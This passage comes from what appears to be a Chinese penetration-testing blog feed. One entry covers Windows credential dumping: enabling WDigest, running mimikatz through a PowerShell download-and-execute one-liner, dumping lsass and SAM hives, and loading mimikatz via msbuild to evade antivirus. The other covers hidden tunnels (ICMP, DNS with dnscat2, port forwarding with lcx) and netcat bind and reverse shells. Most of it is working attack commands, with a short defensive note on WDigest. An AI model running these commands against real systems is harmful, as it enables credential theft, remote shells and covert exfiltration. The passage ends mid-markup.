修改注册表路径,添加一个REG_DWORD类型名为UseLogonCredential设置为1,即可抓取明文</span><br>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest<br><br><span class="hljs-comment"># 命令修改注册表方式如下</span><br>reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f<br></code></pre></td></tr></table></figure><p>下载地址：<a href="https://github.com/gentilkiwi/mimikatz/releases">https://github.com/gentilkiwi/mimikatz/releases</a></p><p> <strong>4.使用Powershell</strong></p><p>或者可以使用Empire的powershell mimikatz<br>powersploit内置有此模块</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">powershell -<span class="hljs-built_in">exec</span> bypass<br>Import-Module .\Get-PassHashes.PS1<br>Get-PassHashes<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/d18b894b6add43709bf3817752c151ca.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>或者powershell版mimikataz</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># ps1脚本下载</span><br>https://github.com/PowerShellMafia/PowerSploit/raw/master/Exfiltration/Invoke-Mimikatz.ps1<br><span class="hljs-comment"># 访问上面链接,会跳转下面链接,所以DownloadString时,使用下面链接,不然会提示“基本连接已关闭等”错误</span><br>https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1<br><br><span class="hljs-comment"># powershell抓取,前提保证目标可以访问ps1脚本,否则将脚本放在内网中 (执行速度非常慢)</span><br>powershell.exe IEX (New-Object Net.WebClient).DownloadString(<span class="hljs-string">&#x27;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&#x27;</span>);Invoke-Mimikatz<br></code></pre></td></tr></table></figure><p>这里我本地搞得就不用远程下载得方式了<br><img src="https://img-blog.csdnimg.cn/20210502173737579.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><strong>5.使用quarkspwdump</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">输入<br>QuarksPwDump.exe --dump-hash-local<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210502175939817.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>下载地址:<a href="http://code.google.com/p/quarkspwdump/">http://code.google.com/p/quarkspwdump/</a> </p><p><strong>6.使用procdump+mimikatz</strong><br>procdump是微软官网发布得工具，可以在命令行下将目标lsass文件导出，且杀毒软件不会拦截这些操作，导出文件后将文件下载到本地，然后用mimikatz导出密码散列值。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">//使用procdump导出lsass.dmp文件<br>procdump64.exe -accepteula -ma lsass.exe lsass.dmp<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210502180911824.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>导出成功，此时当前目录就会增加一个lsass.dmp文件，接下来就用Mimikatz导出密码散列值。<br><img src="https://img-blog.csdnimg.cn/20210502181441542.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>7.通过 SAM和System 文件抓取密码</strong><br>无工具导出SAM文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">reg save hklm\sam sam.hive<br>reg save hklm\system system.hive<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210502182001761.png" alt="在这里插入图片描述"><br>会在当前路径下增加两个文件 sam.hive  和 system.hive<br>使用mimikatz通过sam和system文件获取NTLM Hash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">//将两个文件和Mimikatz放在同一目录下<br>lsadump::sam /sam:sam.hive  /system:system.hive<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210502182520396.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><strong>- wce</strong><br>命令：wce.exe -w（抓取明文）、wce.exe –l（抓取hash）</p><ul><li><strong>限制下载文件长度时导出凭据的方法</strong><br>在c#文件中加载mimikatz的方法，实现以下功能：<br>1.获得lsass.exe进程的dmp文件并保存到temp目录<br>2.从dmp文件导出凭据<br>3.删除dmp文件<br>很多实际情况环境对下载文件做了大小限制</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">C:\Windows\Microsoft.NET\Framework64\v3<span class="hljs-number">.5</span>\csc.exe mimikatz.cs /unsafe<br></code></pre></td></tr></table></figure><p>然后直接执行exe<br>mimikatz bypass<br>1.PE to shellcode<br>下载地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">pe2shc.exe mimikatz.exe mimi.txt<br>runshc64.exe mimi.txt<br></code></pre></td></tr></table></figure><p>这个方法不太行了<br>2.c#加载mimikatz</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">cscript mimikatz.js<br></code></pre></td></tr></table></figure><p>3.白名单加载mimikatz<br>使用白名单程序msbuild进行进行加载xml文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">C:\Windows\Microsoft.NET\Framework64\v4<span class="hljs-number">.0</span><span class="hljs-number">.30319</span>\msbuild.exe mimikatz.xml<br></code></pre></td></tr></table></figure><p>4..net4.0加载mimikatz</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">C:\Windows\Microsoft.NET\Framework64\v4<span class="hljs-number">.0</span><span class="hljs-number">.30319</span>\MSBuild.exe executes-mimikatz.xmlC:\Windows\Microsoft.NET\Framework64\v4<span class="hljs-number">.0</span><span class="hljs-number">.30319</span>\MSBuild.exe executes-mimikatz.xml<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/a3493e73d4ff4acebb3ba5ea204419c8.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><strong>- msf</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">run hashdump<br>hashdump<br>post/windows/gather/credentials/domain_hashdump(获取域<span class="hljs-built_in">hash</span>)<br>use mimikatz<br>wdigest（明文）<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/d487f3bdfe4c445f948f000fb51bf2be.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>实战中抓密码大部分都是直接用msf或c2上的工具抓的吧</p><h2 id="单机抓密码防范方法"><a href="#单机抓密码防范方法" class="headerlink" title="单机抓密码防范方法"></a>单机抓密码防范方法</h2><p>  微软为了防止用户密码在内存种以明文形式泄露，发布了补丁KB2871997,关闭了Wdigest功能。<br>windows server 2012 及以上版本默认关闭Wdigest，使攻击者无法从内存种获取明文密码。Windows server 2012及以下的版本，如果安装了KB2871997,攻击者同样无法获取明文密码。<br>        在日常网络维护中，通过查看注册表项Wdigest，可以判断Wdigest功能的状态。如果该项的值为1，用户下次登录时，攻击者就能使用工具获取明文密码。应该确保该项的值为0，使用户明文密码不会出现在内存中。</p><p>在命令行环境中开启或关闭Wdigest Auth,有如下两种方法<br>1.reg add</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#在注册表中添加一个键值，将其设置为0，电脑注销后,windows将不会把密码明文存储在内存中</span><br>reg add HKLMSYSTEMCurrentControlSetControlSecurityProvidersWDigest /v UseLogonCredential /t REG_DWORD /d 0 /f <br><br><span class="hljs-comment">#在注册表中添加一个键值，将其设置为1，windows会把密码明文存储在内存中</span><br>reg add HKLMSYSTEMCurrentControlSetControlSecurityProvidersWDigest /v UseLogonCredential /t REG_DWORD /d 1 /f<br><br><span class="hljs-comment">#键值是否添加成功</span><br>reg query HKLMSYSTEMCurrentControlSetControlSecurityProvidersWDigest /v UseLogonCredential <span class="hljs-comment">#查询</span><br></code></pre></td></tr></table></figure><p>2.powershell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#开启wdigest Auth</span><br>Set-ItemProperty -Path  HKLMSYSTEMCurrentControlSetControlSecurityProvidersWDigest /v UseLogonCredential -Type DWORD -Value 1<br><br><span class="hljs-comment">#关闭wdigest Auth</span><br>Set-ItemProperty -Path  HKLMSYSTEMCurrentControlSetControlSecurityProvidersWDigest /v UseLogonCredential -Type DWORD -Value 0<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>内网安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网安全</tag>
      
      <tag>密码抓取</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>内网隧道隐藏</title>
    <link href="/2022/06/15/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/"/>
    <url>/2022/06/15/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/</url>
    
    <content type="html"><![CDATA[<h2 id="隐藏通信隧道"><a href="#隐藏通信隧道" class="headerlink" title="隐藏通信隧道"></a><strong>隐藏通信隧道</strong></h2><p><strong>1.1 隐藏通信隧道基础知识</strong></p><p>在实际的网络中，通常会通过各种边界设备、软&#x2F;硬件防火墙甚至入侵检测系统来检查对外连接情况，如果发现异样，就会对通信进行阻断。那么什么是隧道呢？这里的隧道，就是一种绕过端口屏蔽的通信方式。防火墙两端的数据包通过防火墙所允许的数据包类型或端口进行封装，然后穿过防火墙，与对方进行通信。当封装的数据包到达目的地时，将数据包还原，并将还原后的数据包发送到相应服务器上。<br>常用的隧道列举如下：</p><ul><li>网络层：IPv6隧道、IMCP隧道、GRE隧道</li><li>传输层：TCP隧道、UDP隧道、常规端口转发</li><li>应用层：SSH隧道、HTTP隧道、HTTPS隧道、DNS隧道</li></ul><p><strong>1.2 判断内网的连通性</strong><br>判断内网的连通性是指判断机器能否上外网等。要综合判断各种协议（TCP、HTTP、DNS、ICMP等)及端口通信的情况。常见的允许流量流出的端口有80、8080、443、53、110、123等。<br>常用的内网连通性判断方法如下</p><ul><li>ICMP协议</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ping &lt;ip或 域名&gt;<br></code></pre></td></tr></table></figure><ul><li>TCP协议<br>netcat(简称nc)被誉为网络安全界的“瑞士军刀”，是一个短小精悍的工具，通过使用TCP或UDP协议的网络连接读写数据。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc  &lt;ip 端口&gt;<br>例如：<br>nc 192.168.1.1 80<br></code></pre></td></tr></table></figure><ul><li>HTTP协议</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl &lt;ip:端口&gt;<br></code></pre></td></tr></table></figure><p>如果远程主机开启了相应的端口，会输出相应的端口信息，如果远程主机没有开启相应的端口，则没有任何提示。</p><ul><li>DNS协议<br>在进行DNS连通性检测时，常用的命令为nslookup和dig</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nslookup 域名<br></code></pre></td></tr></table></figure><p>有一种情况是流量不能直接流出，需要在内网中设置代理服务器，常见于通过企业办公网段上网的场景。常见的判断方法如下。<br>1.查看网络连接，判断是否存在与其他机器8080(不绝对)等端口的连接(可以尝试运行 “ping -n 1 -a ip”)<br>2.查看内网中是否有主机名类似于”proxy”的机器<br>3.查看IE浏览器的直接代理<br>4.根据pac文件的路径(可能是本地路径，也可能是远程路径），将其下载下来并查看。<br>5.执行如下命令，利用curl工具确认</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl www.baidu.com   //不通<br>curl -x proxy-ip:port wwww.baidu.com    //通<br></code></pre></td></tr></table></figure><p><strong>2.1 网络层隧道技术</strong></p><ul><li>ICMP隧道<br>常用工具有：icmpsh、PingTunnel、icmptunnel、powershell icmp等<br>1.icmpsh<br>因为icmpsh工具要代替系统本身的Ping命令的应答程序，所有需要输入如下命令来关闭本地系统的icmp应答（如果需要恢复，设置为0），否则shell的运行不稳定</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sysctl -w net.ipv4.icmp_echo_ignore_all=1<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210506221022965.png" alt="在这里插入图片描述"></p><p>配置环境服务端：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">yum -y install epel-release<br>yum -y install python-pip<br>pip install --upgrade pip -i https://pypi.tuna.tsinghua.edu.cn/simple<br>pip install Impacket -i https://pypi.tuna.tsinghua.edu.cn/simple<br></code></pre></td></tr></table></figure><p>VPS运行：<br><img src="https://img-blog.csdnimg.cn/20210506223126341.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>直接运行run.sh会报错。所以这里运行py的脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python icmpsh_m.py &lt;vpsIP&gt; &lt;受控端IP&gt;<br></code></pre></td></tr></table></figure><p>目标主机运行：<br>将icmpsh.exe扔进目标主机</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">.\icmpsh.exe -t vps主机IP  <br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2021050622384811.png" alt="在这里插入图片描述"><br>结果：<br><img src="https://img-blog.csdnimg.cn/2021050622390638.png" alt="在这里插入图片描述"><br>项目地址：<a href="https://github.com/inquisb/icmpsh">https://github.com/inquisb/icmpsh</a></p><ul><li>Pingtunnel<br>Pingtunnel也是一款常用的隧道工具。可跨平台使用。为避免隧道被滥用，可以为隧道设置密码</li></ul><p><img src="https://img-blog.csdnimg.cn/20210506234735805.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>搭建：下载后解压</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> PingTunnel<br>make &amp;&amp; make install<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210506224727637.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>跳板机运行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ptunnel -x shuteer<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210506225941907.png" alt="在这里插入图片描述"><br>攻击机运行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./ptunnel -p 192.168.112.37 -lp 1080 -da 10.10.10.30 -dp 3389 -x shuteer<br></code></pre></td></tr></table></figure><pre><code class="hljs">-lp：指定本地监听的端口-p 指定ICMP隧道另一端的IP-da：指定要转发的目标机器的IP-dp：指定要转发的目标机器的端口-x：指定连接密码</code></pre><p><img src="https://img-blog.csdnimg.cn/20210506234624153.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>攻击机连接目标3389端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">rdesktop -f  192.168.112.254:1080<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210506234915577.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>成功连接到目标机</p><p>Pingtunnel工具在windows环境中也可以运行，只不过要在内网的Windows机器上安全wincap类库。</p><p><strong>2.2 传输层隧道技术</strong></p><ul><li>LCX<br>1.内网端口转发<br>lcx工具是一个基于Socket套接字实现的端口转发工具。有windows和Linux两个版本。windows为lcx.exe,liunx版本为portmap。</li></ul><p>在目标机上执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#将目标机上的3389端口的所有数据转发到公网vps的4444端口上</span><br>lcx.exe  -slave &lt;vps主机地址&gt; 4444  127.0.0.1  3389<br><br>portmap -m 3 -h1 127.0.0.1 -p1 33389 -h2 &lt;vps主机地址&gt; -p2 4444<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210507230736535.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>在vps上执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#将本机 4444端口上监听的所有数据转发到本机的5555端口上</span><br>lcx.exe  -listen 4444 5555<br><br>portmap -m 2 -p1 4444 -h2 &lt;vps主机地址&gt; -p2 5555<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210507230705555.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>结果：<br><img src="https://img-blog.csdnimg.cn/20210507230846339.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>成功访问到目标3389</p><p>2.本地端口映射<br>如果目标服务器由于防火墙的限制，部分端口(例如3389)的数据无法通过防火墙，可以将目标服务器相应的端口的数据穿透传到防火墙允许的其他端口(例如53）。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">lcx.exe -tran 53 &lt;目标主机IP地址&gt; 3389<br></code></pre></td></tr></table></figure><ul><li>netcat<br>常用参数:<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">-l ： 使用监听模式，管理和控制传入的数据<br>-p : 设置本地主机使用的通信端口<br>-v ： 详细输出<br>-d ：后台模式<br>-e : 程序重定向<br></code></pre></td></tr></table></figure></li></ul><p>1.获取shell<br>（1）正向shell<br>在目标主机上执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lvp 4444 -e /bin/sh     //linux<br>nc -lvp 4444 -e c:\windows\system32\cmd.exe      //windows<br></code></pre></td></tr></table></figure><p>在vps上执行：<br><img src="https://img-blog.csdnimg.cn/2021050811272211.png" alt="在这里插入图片描述"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc &lt;目标主机IP&gt;  4444<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210508112743205.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>（2）.反向shell<br>在目标机上执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc &lt;vps主机IP&gt; 9999 -e /bin/sh      //linux<br>nc &lt;vps主机IP&gt; 9999 -e c:\windows\system32\cmd.exe      //windows<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210508115105804.png" alt="在这里插入图片描述"></p><p>在vps上执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lvp 9999<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210508115128840.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210508115140193.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>2.nc代理<br>在这里插入图片描述</p><p>在kali中访问到10.10.10.12<br>在kali中执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lvp 3333<br></code></pre></td></tr></table></figure><p>在内网主机中执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lvp  3333 -e c:\windows\system32\cmd.exe<br></code></pre></td></tr></table></figure><p>在web服务器中执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -v 192.168.43.254 3333 -c <span class="hljs-string">&quot;nc -v 10.10.10.12 3333&quot;</span><br></code></pre></td></tr></table></figure><p>由于我环境问题就不演示了，在实战中也基本不会用到，了解就行了</p><p><strong>2.3应用层隧道技术</strong><br>常用的隧道协议有ssh、htto\https和dns。</p><ul><li>DNS协议:<br>首先，需要知道当前服务器是否允许内部的DNS解析外部的域名，也就是要测试DNS的连通性。<br>输入如下命令查看当前内部域名及IP地址：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#linux</span><br><span class="hljs-built_in">cat</span> /etc/resolv.conf | grep -v <span class="hljs-string">&#x27;#&#x27;</span><br><span class="hljs-comment">#windows</span><br>nslookup 内部的域名<br></code></pre></td></tr></table></figure><p>能够通过内部dns服务器解析外部域名，这意味着可以使用DNS隧道隐蔽通信。<br>（1）dnscat2<br>dnscat2工具的服务端是由ruby语言编写，而客户端是由c语言编写。现在也有powershell版。<br>它可以用自己的本身的客户端也可以用powercat作为客户端(powecat可以说是nc的powershell版)</p><p>使用dnscat2隧道的模式有两种，分别是直连模式和中继模式。</p><ul><li>直连模式：客户端直接指向IP地址的DNS服务器发起DNS解析请求。</li><li>中继模式：DNS经过互联网的迭代解析，指向指定的DNS服务器，与直连相比，中继模式的速度较慢。<br>服务端：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#启动</span><br>ruby./dnscat2.rb abc.com --secret=123456   <span class="hljs-comment">#方式1【常用】</span><br>ruby./dnscat2.rb --dns server=127.0.0.1,port=53,<span class="hljs-built_in">type</span>=TXT --secret=123456   <span class="hljs-comment">#方式2</span><br>ruby./dnscat2.rb abc.com --secret=123456 --security=open --no-cache   <span class="hljs-comment">#方式3</span><br>ruby ./dnscat2.rb  <span class="hljs-comment">#方式4</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#命令详解</span><br>-c : 加密通信<br>-e ：规定安全级别，<span class="hljs-string">&#x27;open&#x27;</span>表示服务端允许客户端不进行加密<br>--no-cache : 禁止缓存。<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210508133139221.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>客户端:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">dnscat --secret=123456 abc.com    <span class="hljs-comment">#对应 方式1、3</span><br>dnscat --dns server=&lt;your dnscat2 server ip&gt;,port=553,<span class="hljs-built_in">type</span>=TXT   <span class="hljs-comment">#对应 方式2，注意使用--dns选项时，port不可省，否则可能连不上</span><br>./dnscat --dns=server=192.168.43.254,port=53 <span class="hljs-comment">#对应方式4</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210508132522708.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>结果：<br>可以看见已经接收到一个session<br><img src="https://img-blog.csdnimg.cn/20210508133218338.png" alt="在这里插入图片描述"><br><img 